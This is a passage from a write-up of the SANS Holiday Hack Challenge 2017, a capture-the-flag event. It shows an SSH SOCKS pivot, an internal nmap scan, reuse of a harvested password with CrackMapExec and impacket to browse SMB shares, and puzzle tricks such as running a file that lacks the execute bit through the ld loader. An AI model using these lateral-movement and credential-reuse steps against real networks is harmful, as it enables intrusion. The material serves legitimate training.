&lt;code&gt;nmap&lt;/code&gt; isn't installed on the machine: in a real world example, this
would most likely be the case, and that's how I did it (it didn't even cross
my mind that &lt;code&gt;nmap&lt;/code&gt; could be installed, and I just checked when writing
this write-up).&lt;/p&gt;
&lt;p&gt;Now that we have valid SSH credentials, we can create a SOCKS proxy using the
&lt;code&gt;-D&lt;/code&gt; option. We can then use a tool like &lt;code&gt;proxychains&lt;/code&gt; to redirect
our different tools through our SOCKS proxy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="c1"&gt;# in one terminal&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ssh -D &lt;span class="m"&gt;4242&lt;/span&gt; alabaster_snowball@dev.northpolechristmastown.com
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="c1"&gt;# in another terminal&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; tail -n &lt;span class="m"&gt;6&lt;/span&gt; /etc/proxychains.conf
&lt;span class="go"&gt;[ProxyList]&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; add proxy here ...
&lt;span class="gp"&gt;#&lt;/span&gt; meanwile
&lt;span class="gp"&gt;#&lt;/span&gt; defaults &lt;span class="nb"&gt;set&lt;/span&gt; to &lt;span class="s2"&gt;&amp;quot;tor&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;socks4     127.0.0.1 4242 # modify here in your configuration file&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; proxychains nmap -sT -Pn --top-port &lt;span class="m"&gt;10&lt;/span&gt; --open -iL ./up_ips.txt
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now you may notice that I just scanned the top 10 TCP ports. Indeed, scanning
port through a SOCKS proxy can take quite some time, because of the overhead,
so most of the time I just bother to scan the top 10 TCP ports.&lt;/p&gt;
&lt;p&gt;Now, since &lt;code&gt;nmap&lt;/code&gt; is installed on our compromised machine, let's do a
more thorough scan, directly from the &lt;code&gt;hhc17-apache-struts1&lt;/code&gt; machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nmap --open &lt;span class="m"&gt;10&lt;/span&gt;.142.0.0/24 -oA tcp_top_1000_10.142.0.0.24

&lt;span class="go"&gt;Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-25 23:04 UTC&lt;/span&gt;
&lt;span class="go"&gt;Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00021s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 996 closed ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp   open  ssh&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open  http&lt;/span&gt;
&lt;span class="go"&gt;443/tcp  open  https&lt;/span&gt;
&lt;span class="go"&gt;2222/tcp open  EtherNetIP-1&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00021s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 998 closed ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="go"&gt;80/tcp open  http&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00016s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 994 closed ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp   open  ssh&lt;/span&gt;
&lt;span class="go"&gt;25/tcp   open  smtp&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open  http&lt;/span&gt;
&lt;span class="go"&gt;143/tcp  open  imap&lt;/span&gt;
&lt;span class="go"&gt;2525/tcp open  ms-v-worlds&lt;/span&gt;
&lt;span class="go"&gt;3000/tcp open  ppp&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00013s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 996 closed ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp   open  ssh&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open  http&lt;/span&gt;
&lt;span class="go"&gt;389/tcp  open  ldap&lt;/span&gt;
&lt;span class="go"&gt;8080/tcp open  http-proxy&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00052s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 996 filtered ports&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;135/tcp  open  msrpc&lt;/span&gt;
&lt;span class="go"&gt;139/tcp  open  netbios-ssn&lt;/span&gt;
&lt;span class="go"&gt;445/tcp  open  microsoft-ds&lt;/span&gt;
&lt;span class="go"&gt;3389/tcp open  ms-wbt-server&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00018s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 960 closed ports, 35 filtered ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open  http&lt;/span&gt;
&lt;span class="go"&gt;135/tcp  open  msrpc&lt;/span&gt;
&lt;span class="go"&gt;139/tcp  open  netbios-ssn&lt;/span&gt;
&lt;span class="go"&gt;445/tcp  open  microsoft-ds&lt;/span&gt;
&lt;span class="go"&gt;3389/tcp open  ms-wbt-server&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.00023s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 996 closed ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp   open  ssh&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open  http&lt;/span&gt;
&lt;span class="go"&gt;4443/tcp open  pharos&lt;/span&gt;
&lt;span class="go"&gt;9090/tcp open  zeus-admin&lt;/span&gt;

&lt;span class="go"&gt;Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.0045s latency).&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 998 filtered ports&lt;/span&gt;
&lt;span class="go"&gt;Some closed ports may be reported as filtered due to --defeat-rst-ratelimit&lt;/span&gt;
&lt;span class="go"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;80/tcp   open  http&lt;/span&gt;
&lt;span class="go"&gt;3389/tcp open  ms-wbt-server&lt;/span&gt;

&lt;span class="go"&gt;Nmap done: 256 IP addresses (7 hosts up) scanned in 7.17 seconds&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a better view of the internal network.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="third-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id28"&gt;Third page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="north-pole-and-beyond-cryokinetic-magic"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id29"&gt;North Pole and Beyond: Cryokinetic Magic&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="id4"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id30"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                     ___
                    / __'.     .-&amp;quot;&amp;quot;&amp;quot;-.
              .-&amp;quot;&amp;quot;-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-&amp;quot; &amp;quot;-:_,(o:==..`-. '.         .-&amp;quot;-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--&amp;quot;&amp;quot;--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.

Run the CandyCaneStriper executable to complete this challenge.
&lt;/pre&gt;
&lt;p&gt;Ok, so we just have to execute the &lt;code&gt;CandyCaneStripper&lt;/code&gt; executable, let's
take a look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 48K&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 root root 45K Dec 15 19:59 CandyCaneStriper&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;CandyCaneStripper&lt;/code&gt; file is &lt;strong&gt;not&lt;/strong&gt; marked as executable. So we can't
launch it. Let's &lt;code&gt;chmod&lt;/code&gt; it to add the executable flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; chmod +x ./CandyCaneStriper
&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; ls -lh CandyCaneStriper
&lt;span class="go"&gt;-rw-r--r-- 1 root root 45K Dec 15 19:59 CandyCaneStriper&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, it didn't work. Let's take a look at the &lt;code&gt;chmod&lt;/code&gt; executable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; which chmod
&lt;span class="go"&gt;/bin/chmod&lt;/span&gt;
&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; file /bin/chmod
&lt;span class="go"&gt;/bin/chmod: empty&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;chmod&lt;/code&gt; executable is empty, so we don't have it. We can't use the
same trick as for the &lt;code&gt;find&lt;/code&gt; executable from &amp;quot;Winter Wonder Landing&amp;quot;,
because it involded using &lt;code&gt;chmod&lt;/code&gt; to mark our new program as executable.
We seem to be stuck in a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Catch-22_(logic)"&gt;Catch-22 logic&lt;/a&gt;.
So, let's see how we can change our program's attributes, without relying on
&lt;code&gt;chmod&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This &lt;a class="reference external" href="https://unix.stackexchange.com/a/83979"&gt;Stack Exchange answer&lt;/a&gt; gives
us several possibilities. I used the first one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; cp /bin/ls ./CandyCaneStriper_from_ls
&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; cp ./CandyCaneStriper ./CandyCaneStriper_from_ls
&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; ls -lh CandyCaneStriper_from_ls
&lt;span class="go"&gt;-rwxr-xr-x 1 elf elf 45K Dec 23 18:57 CandyCaneStriper_from_ls&lt;/span&gt;
&lt;span class="gp"&gt;elf@cd14b3563680:~$&lt;/span&gt; ./CandyCaneStriper_from_ls
&lt;span class="go"&gt;                   _..._&lt;/span&gt;
&lt;span class="go"&gt;                 .&amp;#39;\\ //`,&lt;/span&gt;
&lt;span class="go"&gt;                /\\.&amp;#39;``&amp;#39;.=&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;               / \/     ;==|&lt;/span&gt;
&lt;span class="go"&gt;              /\\/    .&amp;#39;\`,`&lt;/span&gt;
&lt;span class="go"&gt;             / \/     `&amp;quot;&amp;quot;`&lt;/span&gt;
&lt;span class="go"&gt;            /\\/&lt;/span&gt;
&lt;span class="go"&gt;           /\\/&lt;/span&gt;
&lt;span class="go"&gt;          /\ /&lt;/span&gt;
&lt;span class="go"&gt;         /\\/&lt;/span&gt;
&lt;span class="go"&gt;        /`\/&lt;/span&gt;
&lt;span class="go"&gt;        \\/&lt;/span&gt;
&lt;span class="go"&gt;         `&lt;/span&gt;
&lt;span class="go"&gt;The candy cane striping machine is up and running!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id5"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id31"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Having managed to execute the program, I decided to take a look at &lt;a class="reference external" href="https://twitter.com/GreenesterElf"&gt;Holly
Evergreen's Twitter profile&lt;/a&gt;. In &lt;a class="reference external" href="https://twitter.com/GreenesterElf/status/938544194070634496"&gt;this
tweet&lt;/a&gt;, she
points to a &lt;a class="reference external" href="https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set"&gt;Super User answer&lt;/a&gt;,
which explains how to execute a program that is not marked as executable.&lt;/p&gt;
&lt;p&gt;The accepted answer says that we can use the program linker/loader as an
interpreter. Let's give it a try:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@fea39a7c28e3:~$&lt;/span&gt; ls -lh ./CandyCaneStriper
&lt;span class="go"&gt;-rw-r--r-- 1 root root 45K Dec 15 19:59 ./CandyCaneStriper&lt;/span&gt;
&lt;span class="gp"&gt;elf@fea39a7c28e3:~$&lt;/span&gt; /lib/x86_64-linux-gnu/ld-2.23.so ./CandyCaneStriper
&lt;span class="go"&gt;                   _..._&lt;/span&gt;
&lt;span class="go"&gt;                 .&amp;#39;\\ //`,&lt;/span&gt;
&lt;span class="go"&gt;                /\\.&amp;#39;``&amp;#39;.=&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;               / \/     ;==|&lt;/span&gt;
&lt;span class="go"&gt;              /\\/    .&amp;#39;\`,`&lt;/span&gt;
&lt;span class="go"&gt;             / \/     `&amp;quot;&amp;quot;`&lt;/span&gt;
&lt;span class="go"&gt;            /\\/&lt;/span&gt;
&lt;span class="go"&gt;           /\\/&lt;/span&gt;
&lt;span class="go"&gt;          /\ /&lt;/span&gt;
&lt;span class="go"&gt;         /\\/&lt;/span&gt;
&lt;span class="go"&gt;        /`\/&lt;/span&gt;
&lt;span class="go"&gt;        \\/&lt;/span&gt;
&lt;span class="go"&gt;         `&lt;/span&gt;
&lt;span class="go"&gt;The candy cane striping machine is up and running!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And it worked, indeed! TIL you can execute a program without it being marked
as executable.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id6"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id32"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Since we managed to execute the program, we get a new tool: the Thermite, which
can melts the snowball, reduce its size, and thus modify its speed.&lt;/p&gt;
&lt;img alt="cryokinetic_magic_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/cryokinetic_magic_terminal.png" /&gt;
&lt;p&gt;Now here's the layout I used to redirect the snowball:&lt;/p&gt;
&lt;img alt="cryokinetic_magic_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/cryokinetic_magic_snowball.gif" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-smb-server"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id33"&gt;North Pole Christmas Town infrastructure: SMB server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;If we take a look at the &lt;code&gt;nmap&lt;/code&gt; scan, we can see that a server called
&lt;code&gt;hhc17-smb-server.c.holidayhack2017.internal&lt;/code&gt;. This must be an SMB
server used to share some files. Let's try to connect to it using Alabaster
Snowball's credentials. To do this, I'm using &lt;code&gt;proxychains&lt;/code&gt;, and
&lt;a class="reference external" href="https://twitter.com/byt3bl33d3r"&gt;&amp;#64;byt3bl33d3r&lt;/a&gt;'s excellent
&lt;code&gt;CrackMapExec&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; proxychains cme &lt;span class="m"&gt;10&lt;/span&gt;.142.0.7 -u alabaster_snowball -p stream_unhappy_buy_loss --shares
&lt;span class="go"&gt;ProxyChains-3.1 (http://proxychains.sf.net)&lt;/span&gt;
&lt;span class="go"&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:4242-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.142.0.7:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       [*] Windows 10.0 Build 14393 (name:HHC17-EMI) (domain:HHC17-EMI)&lt;/span&gt;
&lt;span class="go"&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:4242-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.142.0.7:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&lt;/span&gt;
&lt;span class="go"&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:4242-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.142.0.7:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       [+] HHC17-EMI\alabaster_snowball:stream_unhappy_buy_loss&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       [+] Enumerating shares&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       SHARE           Permissions&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       -----           -----------&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       FileStor        READ&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       ADMIN$          NO ACCESS&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       IPC$            READ&lt;/span&gt;
&lt;span class="go"&gt;CME          10.142.0.7:445 HHC17-EMI       C$              NO ACCESS&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, we have read access to the &lt;code&gt;FileStor&lt;/code&gt; share. Let's connect to it.
I'm using &lt;a class="reference external" href="https://github.com/CoreSecurity/impacket"&gt;impacket&lt;/a&gt;'s
&lt;code&gt;smbclient.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; proxychains smbclient.py alabaster_snowball:stream_unhappy_buy_loss@10.142.0.7
&lt;span class="go"&gt;ProxyChains-3.1 (http://proxychains.sf.net)&lt;/span&gt;
&lt;span class="go"&gt;Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies&lt;/span&gt;

&lt;span class="go"&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:4242-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.142.0.7:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&lt;/span&gt;
&lt;span class="go"&gt;Type help for list of commands&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; use FileStor
&lt;span class="gp"&gt;#&lt;/span&gt; ls
&lt;span class="go"&gt;drw-rw-rw-          0  Mon Dec 25 05:09:11 2017 .&lt;/span&gt;
&lt;span class="go"&gt;drw-rw-rw-          0  Mon Dec 25 05:09:11 2017 ..&lt;/span&gt;
&lt;span class="go"&gt;-rw-rw-rw-     255520  Mon Dec 25 05:09:28 2017 BOLO - Munchkin Mole Report.docx&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-rw-rw-rw-    1275756  Mon Dec  4 21:04:34 2017 GreatBookPage3.pdf&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;-rw-rw-rw-     133295  Wed Dec  6 22:47:47 2017 MEMO - Password Policy Reminder.docx&lt;/span&gt;
&lt;span class="go"&gt;-rw-rw-rw-      10245  Wed Dec  6 23:28:21 2017 Naughty and Nice List.csv&lt;/span&gt;
&lt;span class="go"&gt;-rw-rw-rw-      60344  Wed Dec  6 22:51:47 2017 Naughty and Nice List.docx&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Among other files that may be useful later, we find the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage3.pdf"&gt;third page to The
Great Book&lt;/a&gt;
(sha256: &lt;code&gt;6b99d47103d4030e643c8073dfab0915b0bf1a265c32035ec604148abd49d64e&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Great Schism&lt;/p&gt;
&lt;p&gt;Many centuries ago, the Little People of Oz were united - one people
sharing peace and laughter all the way. But then, tragedy struck - The
Great Schism split the community into two bitterly opposed factions: the
Munchkins and the Elves. The original cause of this acrimonious division
has long been forgotten.&lt;/p&gt;
&lt;p&gt;As The Great Schism escalated from verbal arguments to fist fights to the
rise of actual armed militias, the Wizard knew he had to act. He reached
out to his good friend, Santa Claus, who at the time was setting up a
worldwide gift distribution operation at the North Pole. To avoid the
near-certain bloodshed of an Oz-wide civil war, the Wizard and Santa agreed
that they would relocate the Elven faction to the North, where they would
help Santa manufacture presents and run the North Pole's infrastructure.
The Munchkins would remain in Oz, living as before, but viewing the Elves'
departure as a banishment. The Elves themselves regard their move as
a magnanimous and voluntary relocation to the North Pole, seeking refuge
from marauding Munchkins.&lt;/p&gt;
&lt;p&gt;Sadly, although violence between the Munchkins and the Elves was thwarted,
there remains a seething hatred between the two peoples. Despite the best
efforts of Santa and the Wizard of Oz, anti-Elf propaganda appears from
time to time in Oz, as does anti-Munchkin sentiment in the North Pole.
Indeed, the two peoples remain in a perpetual state of cold ward. Sadly,
the chilling after-affects of The Great Schism are felt to this very day.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="fourth-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id34"&gt;Fourth page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="north-pole-and-beyond-there-s-snow-place-like-home"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id35"&gt;North Pole and Beyond: There's Snow Place Like Home&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="cranberry-pi"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id36"&gt;Cranberry Pi&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                             ______
                          .-&amp;quot;&amp;quot;&amp;quot;&amp;quot;.._'.       _,##
                   _..__ |.-&amp;quot;&amp;quot;&amp;quot;-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-&amp;quot;&amp;quot;-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-&amp;quot;;.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
&lt;/pre&gt;
&lt;p&gt;Alright, once again, we're supposed to execute a program. Let's see:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@36ff87294cc6:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 444K&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root 444K Dec  7 18:43 trainstartup&lt;/span&gt;
&lt;span class="gp"&gt;elf@a6b0a5dfef57:~$&lt;/span&gt; ./trainstartup
&lt;span class="go"&gt;bash: ./trainstartup: cannot execute binary file: Exec format error&lt;/span&gt;
&lt;span class="gp"&gt;elf@a6b0a5dfef57:~$&lt;/span&gt; file ./trainstartup
&lt;span class="go"&gt;./trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped&lt;/span&gt;
&lt;span class="gp"&gt;elf@a6b0a5dfef57:~$&lt;/span&gt; uname -a
&lt;span class="go"&gt;Linux a6b0a5dfef57 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, just like for the &lt;code&gt;find&lt;/code&gt; executable in &amp;quot;Winter Wonder Landing&amp;quot;,
we're stuck with an ARM program, while we're running on an Intel x64 processor.
However, we can't replace this program with an x64 version, since it's a
custom program! We must find a way to execute ARM on an Intel x64 processor.&lt;/p&gt;
&lt;p&gt;This usually means that we have to use some kind of virtualization solution.
One virtualization solution that works in CLI, and can launch program
independently, without having to virtualize a whole OS is QEMU. Let's see if
the machine has QEMU:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@a6b0a5dfef57:~$&lt;/span&gt; find / -name &lt;span class="s1"&gt;&amp;#39;qemu*&amp;#39;&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt; /dev/null
&lt;span class="hll"&gt;&lt;span class="go"&gt;/usr/bin/qemu-arm&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;/usr/bin/qemu-alpha&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-sh4eb&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-mips&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-aarch64&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-sparc32plus&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-m68k&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-microblazeel&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-ppc64&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-mipsn32&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-microblaze&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-mips64&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-sparc64&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-s390x&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-mips64el&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-mipsel&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-cris&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-armeb&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-sparc&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-unicore32&lt;/span&gt;
